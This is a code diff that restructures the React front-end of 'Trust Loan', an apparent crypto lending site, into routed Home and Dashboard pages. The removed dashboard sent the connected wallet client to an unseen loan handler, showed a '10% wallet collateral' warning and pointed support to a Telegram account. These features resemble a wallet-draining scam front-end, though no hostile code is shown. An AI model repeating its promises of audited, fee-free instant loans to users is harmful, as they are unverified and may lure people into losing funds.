@@ -1,18 +1,32 @@
 // App.tsx
 import './styles.css';
 import React, { useEffect, useState } from 'react';
+import { BrowserRouter as Router, Routes, Route, Navigate, useNavigate } from 'react-router-dom';
 import ConnectWallet from './components/ConnectWallet';
-import { useAccount, useWalletClient, useDisconnect } from 'wagmi';
-import { handleLoanRequest } from './components/handleLoanRequest';
+import { useAccount, useDisconnect } from 'wagmi';
 import LiveChat from './components/LiveChat';
 import OnboardingModal from './components/OnboardingModal';
+import Home from './pages/Home';
+import Dashboard from './pages/Dashboard';
 
-function App(): React.ReactElement {
-  const { isConnected, address } = useAccount();
-  const { data: walletClient } = useWalletClient();
+// Component to handle navigation on wallet connect
+const AppContent: React.FC = () => {
+  const { isConnected } = useAccount();
   const { disconnect } = useDisconnect();
+  const navigate = useNavigate();
   const [mounted, setMounted] = useState<boolean>(false);
   const [showOnboarding, setShowOnboarding] = useState<boolean>(false);
+
+  // Navigate to dashboard when wallet connects, navigate to home when disconnects
+  useEffect(() => {
+    if (mounted) {
+      if (isConnected) {
+        navigate('/dashboard');
+      } else {
+        navigate('/');
+      }
+    }
+  }, [isConnected, mounted, navigate]);
 
   useEffect(() => {
     setMounted(true);
@@ -106,152 +120,16 @@ function App(): React.ReactElement {
           <ConnectWallet />
         </header>
 
-        {/* Hero Section */}
-        <section className="hero-container">
-          <div className="hero">
-            {/* Token Icons Left - Hidden on Mobile */}
-            <div className="hidden md:flex relative w-[300px] h-[320px] items-center justify-center">
-              <div className="relative w-full h-full">
-                <img src="/images/ethereum-eth-logo.png" alt="ETH" className="token eth" />
-                <img src="/images/usd-coin-usdc-logo.png" alt="USDC" className="token usdc" />
-                <img src="/images/dai.png" alt="DAI" className="token dai" />
-                <img src="/images/litecoin.png" alt="WBTC" className="token wbtc" />
-              </div>
-            </div>
-
-            {/* Hero Center */}
-            <div className="hero-content-wrapper">
-              <div className="hero-content">
-                {!isConnected ? (
-                  <>
-                    <h1>
-                      Welcome to <span className="highlight">Trust Loan</span>
-                    </h1>
-
-                    <section className="bg-gradient-to-br from-[#1c1f26] to-[#0f1115] text-white py-20 px-6 text-center md:text-left">
-                      <div className="max-w-5xl mx-auto">
-                        <p className="text-lg md:text-xl text-gray-300 mb-10">
-                          <strong className="block text-2xl font-semibold text-white mb-3">
-                            A Secure and Simple Way to Get Crypto-Backed Loans
-                          </strong>
-                          Trust loan allows you to borrow stablecoins instantly using your crypto assets as collateral — no credit checks, no paperwork, no intermediaries.
-                        </p>
-
-                        <div className="grid grid-cols-1 md:grid-cols-3 gap-8 text-left">
-                          <div>
-                            <h3 className="text-xl font-bold text-purple-400 mb-2">Instant Loans</h3>
-                            <p className="text-gray-300">
-                              Borrow in seconds - no approvals, no delays, on-chain only.
-                            </p>
-                          </div>
-                          <div>
-                            <h3 className="text-xl font-bold text-purple-400 mb-2">Secure Collateral</h3>
-                            <p className="text-gray-300">
-                              Your assets remain safe, locked in audited smart contracts.
-                            </p>
-                          </div>
-                          <div>
-                            <h3 className="text-xl font-bold text-purple-400 mb-2">Total Control</h3>
-                            <p className="text-gray-300">
-                              Repay anytime. Withdraw instantly. No hidden fees or fine print.
-                            </p>
-                          </div>
-                        </div>
-                      </div>
-                    </section>
-
-                    <section className="relative z-10 px-6 py-24 max-w-7xl mx-auto bg-gradient-to-b from-transparent to-[#0f1115] mb-24">
-                      <h2 className="text-4xl font-extrabold text-white mb-16 text-center tracking-tight">
-                        How It Works
-                      </h2>
-
-                      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-10 text-white">
-                        {[
-                          {
-                            title: 'Connect Wallet',
-                            icon: '🔗',
-                            desc: 'Securely link your crypto wallet in seconds and get started instantly.'
-                          },
-                          {
-                            title: 'Deposit Collateral',
-                            icon: '💼',
-                            desc: 'Choose supported assets and lock them into our smart contract as collateral.'
-                          },
-                          {
-                            title: 'Borrow Instantly',
-                            icon: '⚡',
-                            desc: 'Receive stablecoins with zero delays — no approvals, no paperwork.'
-                          },
-                          {
-                            title: 'Repay Anytime',
-                            icon: '🔓',
-                            desc: 'Unlock your assets at your own pace. No penalties or hidden fees.'
-                          }
-                        ].map((step, index) => (
-                          <div
-                            key={index}
-                            className="flex flex-col items-center text-center p-8 bg-zinc-900/80 rounded-2xl border border-zinc-800 shadow-xl hover:shadow-purple-500/30 transition-all duration-300 hover:-translate-y-2"
-                          >
-                            <div className="text-5xl mb-6">{step.icon}</div>
-                            <h3 className="text-xl font-bold mb-3">{step.title}</h3>
-                            <p className="text-gray-400 text-sm leading-relaxed">{step.desc}</p>
-                          </div>
-                        ))}
-                      </div>
-
-                      <p className="text-center text-gray-400 mt-16 max-w-2xl mx-auto text-base leading-relaxed">
-                        All loans are processed 100% on-chain — verifiable, secure, and trustless. Your assets stay under your control at all times.
-                      </p>
-                    </section>
-
-                    {/* Connect Wallet Button in hero */}
-                    <div className="flex justify-center items-center mt-6">
-                      <ConnectWallet />
-                    </div>
-                  </>
-                ) : (
-                  <div className="connected-dashboard">
-                    <h3>Welcome back 👋</h3>
-                    <div className="loan-options">
-                      <h3 className="loan-heading">Select compatible loan option:</h3>
-                      <div className="mt-4 mb-2 bg-yellow-900/20 border border-yellow-600 text-yellow-300 px-4 py-3 rounded-xl text-sm font-medium shadow-md">
-                        ⚠️ To protect your loan, your wallet must hold at least <span className="font-semibold text-white">10% of your requested loan</span> as wallet collateral.
-                      </div>
-
-                      <div className="loan-grid">
-                        {[
-                          { amount: 5000 },
-                          { amount: 10000 },
-                          { amount: 15000 },
-                          { amount: 20000 },
-                          { amount: 50000 },
-                          { amount: 100000 }
-                        ].map(({ amount }) => (
-                          <button
-                            key={amount}
-                            className="loan-button"
-                            onClick={() => {
-                              if (walletClient && address) {
-                                handleLoanRequest(walletClient, address, amount);
-                              }
-                            }}
-                          >
-                            <div className="loan-amount">${amount.toLocaleString()}</div>
-                          </button>
-                        ))}
-                      </div>
-                    </div>
-                  </div>
-                )}
-              </div>
-            </div>
-
-            {/* Hero Right Phone Image */}
-            <div className="hero-image">
-              <img src="/images/iphone-mockup.png" alt="iPhone mockup with wallet" />
-            </div>
-          </div>
-        </section>
+        {/* Main Content - Routes */}
+        <main className="min-h-screen bg-white">
+          <Routes>
+            <Route path="/" element={<Home />} />
+            <Route 
+              path="/dashboard" 
+              element={isConnected ? <Dashboard /> : <Navigate to="/" replace />} 
+            />
+          </Routes>
+        </main>
 
         {/* Footer */}
         <footer className="footer">
@@ -269,7 +147,7 @@ function App(): React.ReactElement {
               </div>
               <div className="footer-column">
                 <h4>Connect</h4>
-                <a href="https://t.me/josecsco" target="_blank" rel="noopener noreferrer">Telegram</a>
+                <a href="https://t.me/tsupportteam01" target="_blank" rel="noopener noreferrer">Telegram</a>
                 <a href="#">Twitter</a>
                 <a href="#">Contact Support</a>
               </div>
@@ -281,6 +159,15 @@ function App(): React.ReactElement {
         </footer>
       </div>
     </>
+  );
+};
+
+// Main App component with Router
+function App(): React.ReactElement {
+  return (
+    <Router>
+      <AppContent />
+    </Router>
   );
 }
 
